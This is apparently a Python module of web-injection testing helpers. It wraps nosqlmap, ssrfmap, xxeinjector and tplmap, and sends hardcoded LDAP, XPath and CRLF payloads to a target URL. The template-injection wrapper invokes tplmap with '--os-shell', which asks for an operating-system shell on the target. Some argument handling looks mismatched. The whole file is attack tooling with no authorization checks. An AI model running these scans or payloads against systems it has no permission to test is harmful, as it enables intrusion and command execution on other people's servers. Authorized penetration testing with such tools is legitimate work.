#!/usr/bin/env python3
"""Injection Testing Tools - Simple, focused implementations"""

import subprocess
import requests
from typing import Dict, Any, List, Optional

def nosqlmap_scan(target_url: str, method: str = "GET", data: Optional[str] = None) -> Dict[str, Any]:
    """NoSQL injection testing"""
    try:
        cmd = ['nosqlmap', '-u', target_url, '-m', method]
        if data:
            cmd.extend(['--data', data])
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return {"success": result.returncode == 0, "output": result.stdout, "tool": "nosqlmap"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def ssrf_sheriff_scan(target_url: str, payloads_file: Optional[str] = None) -> Dict[str, Any]:
    """SSRF vulnerability scanner"""
    try:
        cmd = ['ssrfmap', '-r', target_url]
        if payloads_file:
            cmd.extend(['-p', payloads_file])
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        return {"success": result.returncode == 0, "vulnerabilities": result.stdout, "tool": "ssrf-sheriff"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def xxeinjector_test(target_url: str, parameter: str, method: str = "POST") -> Dict[str, Any]:
    """XXE vulnerability testing"""
    try:
        cmd = ['xxeinjector', '--url', target_url, '--param', parameter, '--method', method]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return {"success": result.returncode == 0, "results": result.stdout, "tool": "xxeinjector"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def ldap_injection_test(target_url: str, param: str) -> Dict[str, Any]:
    """LDAP injection testing"""
    try:
        # Simple LDAP injection payloads
        payloads = ['*', '*)(uid=*', '*()|%26', 'admin)(!(&(1=0']
        findings = []

        for payload in payloads:
            test_url = f"{target_url}?{param}={payload}"
            resp = requests.get(test_url, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 0:
                findings.append({"payload": payload, "status": resp.status_code})

        return {"success": True, "findings": findings, "tested": len(payloads), "tool": "ldap-injector"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def xpath_injection_test(target_url: str, param: str) -> Dict[str, Any]:
    """XPath injection testing"""
    try:
        # XPath injection payloads
        payloads = ["' or '1'='1", "' or 1=1 or ''='", "1' or '1' = '1", "x' or 1=1 or 'x'='y"]
        findings = []

        for payload in payloads:
            test_url = f"{target_url}?{param}={payload}"
            resp = requests.get(test_url, timeout=10)
            if 'xpath' in resp.text.lower() or 'xml' in resp.text.lower():
                findings.append({"payload": payload, "indication": "xpath_error_detected"})

        return {"success": True, "findings": findings, "tested": len(payloads), "tool": "xpath-injector"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def ssti_scanner(target_url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """Server-Side Template Injection scanner"""
    try:
        cmd = ['tplmap', '-u', target_url]
        if param:
            cmd.extend(['--os-shell', param])
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        return {"success": result.returncode == 0, "output": result.stdout, "tool": "ssti-scanner"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def crlf_injection_scan(target_url: str) -> Dict[str, Any]:
    """CRLF injection testing"""
    try:
        # CRLF injection payloads
        payloads = [
            '%0d%0aSet-Cookie:test=true',
            '%0aSet-Cookie:crlf=injection',
            '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK'
        ]
        findings = []

        for payload in payloads:
            test_url = f"{target_url}?redirect={payload}"
            resp = requests.get(test_url, allow_redirects=False, timeout=10)
            if 'Set-Cookie' in resp.headers and 'test=true' in str(resp.headers):
                findings.append({"payload": payload, "vulnerable": True})

        return {"success": True, "findings": findings, "tested": len(payloads), "tool": "crlf-injection-scanner"}
    except Exception as e:
        return {"success": False, "error": str(e)}
